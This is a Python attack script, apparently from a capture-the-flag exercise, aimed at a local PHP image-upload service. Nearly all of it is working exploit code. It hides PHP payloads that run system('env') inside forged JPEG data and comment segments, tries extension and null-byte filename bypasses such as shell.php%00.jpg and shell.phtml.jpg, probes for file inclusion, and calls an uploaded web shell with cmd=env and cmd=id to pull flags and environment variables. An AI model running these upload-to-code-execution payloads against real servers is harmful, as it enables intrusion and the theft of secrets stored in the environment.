import requests
import re

base_url = "http://127.0.0.1:33021"

# Create minimal valid JPEG
def create_minimal_jpeg():
    jpeg = b'\xff\xd8'
    jpeg += b'\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg += b'\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t'
    jpeg += b'\x08\x0a\x0c\x14\x0d\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a'
    jpeg += b'\x1f\x1e\x1d\x1a\x1c\x1c $.\x28 #\x17\x1c,),.444444)\x22\x22\x22'
    jpeg += b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
    jpeg += b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00'
    jpeg += b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
    jpeg += b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00'
    jpeg += b'\x7f\xd4\xb5\xa8\x88'
    jpeg += b'\xff\xd9'
    return jpeg

jpeg_content = create_minimal_jpeg()

# Test 1: Analyze what gets uploaded with .php.jpg extension
print("[*] TEST 1: Analyze .php.jpg upload behavior")
php_code = b'<?php echo "MARKER123"; ?>'
# First try with JPEG header
payload_with_header = jpeg_content + php_code
files = {'userfile': ('analyze.php.jpg', payload_with_header, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Response: {r.text[:500]}")

# Check what was uploaded
r2 = requests.get(f"{base_url}/upload/analyze.php.jpg")
print(f"[+] File size: {len(r2.content)} bytes")
print(f"[+] Content: {r2.content}")
print(f"[+] Contains JPEG header: {b'\\xff\\xd8' in r2.content}")
print(f"[+] Contains PHP: {b'MARKER123' in r2.content}")

# Test 2: Try uploading with .jpg extension only
print("\n[*] TEST 2: Upload with clean .jpg extension")
files = {'userfile': ('clean.jpg', payload_with_header, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
r2 = requests.get(f"{base_url}/upload/clean.jpg")
print(f"[+] File size: {len(r2.content)} bytes")
print(f"[+] Contains JPEG header: {b'\\xff\\xd8' in r2.content}")
print(f"[+] Contains PHP: {b'MARKER123' in r2.content}")

# Test 3: Check if the validation strips content after EOI marker
print("\n[*] TEST 3: Check EOI marker stripping")
# Try putting PHP BEFORE the EOI marker
jpeg_no_eoi = jpeg_content[:-2]  # Remove \xff\xd9
payload_before_eoi = jpeg_no_eoi + b'<?php system("env"); ?>' + b'\xff\xd9'
files = {'userfile': ('before_eoi.jpg', payload_before_eoi, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
r2 = requests.get(f"{base_url}/upload/before_eoi.jpg")
print(f"[+] File size: {len(r2.content)} bytes")
print(f"[+] Content preview: {r2.content[:100]}")

# Test 4: Try with PHP code embedded in JPEG comment
print("\n[*] TEST 4: PHP in JPEG comment")
jpeg_comment = b'\xff\xd8'  # SOI
jpeg_comment += b'\xff\xfe\x00\x1b<?php system("env"); ?>\x00'  # COM marker
jpeg_comment += jpeg_content[2:]  # Rest of JPEG
files = {'userfile': ('comment_php.jpg', jpeg_comment, 'image/jpeg')}
r = requests.post(f"{base_url}/index.php", files=files)
r2 = requests.get(f"{base_url}/upload/comment_php.jpg")
print(f"[+] File size: {len(r2.content)} bytes")
print(f"[+] Content preview: {r2.content[:150]}")

# Test 5: Check for environment variables via existing shell
print("\n[*] TEST 5: Try to read env via existing files")
r = requests.get(f"{base_url}/upload/env.jpg")
print(f"[+] env.jpg content: {r.text}")
if 'FLAG' in r.text:
    flags = re.findall(r'FLAG\{[^}]+\}', r.text)
    print(f"[!!!] FLAGS: {flags}")

# Test 6: Check if there's an include mechanism
print("\n[*] TEST 6: Try to trigger include via parameter")
r = requests.get(f"{base_url}/index.php", params={'img': 'upload/shell.jpg'})
if 'FLAG' in r.text:
    print("[!] Include works!")
    print(r.text)

# Test 7: Check Apache MIME type handling
print("\n[*] TEST 7: Apache MIME type handling")
# Some Apache configs execute .php.jpg as PHP
test_filenames = [
    'shell.php.jpg',
    'shell.php.jpeg',
    'shell.php%00.jpg', 
    'shell.phtml.jpg',
    'shell.php5.jpg',
]
for fname in test_filenames:
    files = {'userfile': (fname, payload_with_header, 'image/jpeg')}
    r = requests.post(f"{base_url}/index.php", files=files)
    match = re.search(r"href='([^']+)'", r.text)
    if match:
        uploaded = match.group(1)
        # Try accessing it
        r2 = requests.get(f"{base_url}/{uploaded}")
        # Check if PHP executed (should not contain raw PHP code)
        if b'<?php' not in r2.content and len(r2.content) > 0:
            print(f"[+] {fname} - PHP might have executed!")
            print(f"    Content: {r2.text[:200]}")

# Test 8: Direct execution attempt
print("\n[*] TEST 8: Direct execution attempts")
r = requests.get(f"{base_url}/upload/shell.jpg", params={'cmd': 'env'})
print(f"[+] shell.jpg?cmd=env: {r.status_code}")
print(f"[+] Content: {r.text}")

# Test 9: Check if there's a way to force PHP processing
print("\n[*] TEST 9: Force PHP processing via Accept header")
headers = {
    'Accept': 'application/x-httpd-php',
}
r = requests.get(f"{base_url}/upload/shell.jpg", headers=headers, params={'cmd': 'id'})
if 'uid=' in r.text:
    print("[!!!] PHP EXECUTION!")
    print(r.text)

